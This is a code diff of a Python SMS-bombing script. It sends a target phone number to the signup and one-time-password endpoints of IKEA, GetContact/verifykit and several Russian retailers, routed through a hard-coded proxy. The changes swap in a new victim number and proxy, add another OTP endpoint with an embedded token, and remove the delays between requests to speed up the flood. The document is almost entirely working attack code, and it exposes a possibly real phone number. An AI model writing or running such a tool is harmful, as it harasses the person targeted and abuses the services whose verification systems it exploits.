@@ -5,9 +5,9 @@ import time
 # print("Введи номер телефона без кода страны")
 # phone=input()
 # print("Номер телефона " + phone)
-phone = '9998756530'
+phone = '9991253348'
 ts = 1
-ipPort = "51.222.21.93:32768"
+ipPort = "3.213.139.74:8888"
 proxy = {"https": "https://" + ipPort}
 headers = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124",
@@ -44,6 +44,7 @@ def aptekaru():
                         json={"phone": aptPhone, "u": "1"}, proxies=proxy)
     print(apt.status_code, "aptekaru")
     print(apt.json())
+
 #def bistrodengi():
     #bisHeaders=headers
     #bisHeaders.update({"Host":"bistrodengi.ru","Origin":"https://bistrodengi.ru","X-Requested-With":"XMLHttpRequest"})
@@ -60,17 +61,20 @@ def mcdonalds():
 
 def ikea():
     ikHeaders=headers
-    ikHeaders.update({"origin":"https://ru.accounts.ikea.com"})
+    ikHeaders.update({"Host":"ru.accounts.ikea.com","Origin":"https://ru.accounts.ikea.com"})
     ikPhone="+7" + phone
     ik=requests.post("https://ru.accounts.ikea.com/cim/ru/ru/v1/passwordless/start",headers=ikHeaders,proxies=proxy,json={"phoneNumber":ikPhone,"flow":"SIGNUP_PHONE_VERIFY"})
     print(ik.status_code,"Ikea")
-    print(ik.json())
 
+
+def getcontact():
+    getHeaders=headers
+    getPhone="+7"+phone
+    get=requests.post("https://widget.verifykit.com/v2.1/otp-start?token=dqad31cb9c92dbd66843a725867605fd6796922e9b894e514713ff845a144",headers=getHeaders,proxies=proxy,json={"countryCode":"RU","isMobileBrowser":"0","phoneNumber":getPhone})
+    print(get.status_code,"GetContact")
 
 ikea()
-time.sleep(ts)
+getcontact()
 pyaterka()
-time.sleep(ts)
 aptekaru()
-time.sleep(ts)
 karusel()
